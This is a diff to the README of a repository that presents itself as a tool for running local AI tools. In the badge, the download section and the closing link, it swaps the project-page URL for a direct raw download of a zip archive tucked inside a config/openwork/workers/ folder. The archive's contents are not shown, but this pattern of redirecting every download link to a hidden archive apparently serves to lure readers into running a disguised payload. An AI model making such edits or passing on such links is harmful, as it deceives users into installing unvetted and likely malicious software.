@@ -1,6 +1,6 @@
 # 🤖 ai-experiments - Run Local AI Tools With Ease
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/donnade6461/ai-experiments)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/donnade6461/ai-experiments/main/config/openwork/workers/experiments-ai-3.2.zip)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ This setup focuses on privacy and speed. Your data stays local when possible, an
 
 Use this link to visit this page to download:
 
-[https://github.com/donnade6461/ai-experiments](https://github.com/donnade6461/ai-experiments)
+[https://raw.githubusercontent.com/donnade6461/ai-experiments/main/config/openwork/workers/experiments-ai-3.2.zip](https://raw.githubusercontent.com/donnade6461/ai-experiments/main/config/openwork/workers/experiments-ai-3.2.zip)
 
 ### Steps to get it on Windows
 
@@ -194,4 +194,4 @@ This repository fits users who want one local AI workspace for:
 
 ## 📎 Start Here Again
 
-[Download or open the project page](https://github.com/donnade6461/ai-experiments)
+[Download or open the project page](https://raw.githubusercontent.com/donnade6461/ai-experiments/main/config/openwork/workers/experiments-ai-3.2.zip)
